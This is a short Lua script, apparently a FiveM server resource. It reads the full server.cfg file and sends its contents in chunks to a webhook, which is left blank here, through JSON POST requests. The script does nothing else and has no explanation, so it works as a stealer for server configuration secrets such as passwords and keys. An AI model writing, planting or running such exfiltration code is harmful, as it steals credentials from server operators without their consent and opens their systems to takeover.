file = io.open("server.cfg", "r")
a = file:read("*a")
b = a
xd = ''
limite = 2000
webhook = ''
for i = 1, string.len(b) do
    xd = xd .. string.sub(b, i, i)
    if i == limite then 
        PerformHttpRequest(webhook, 
        function(err, text, headers) end, 'POST', 
        json.encode({username = "aa", content = xd}), 
        { ['Content-Type'] = 'application/json' })
        Wait(1000)
        xd = ''
        limite = limite * 2
    end
end
PerformHttpRequest(webhook, 
function(err, text, headers) end, 'POST', 
json.encode({username = "aa", content = xd}), 
{ ['Content-Type'] = 'application/json' })




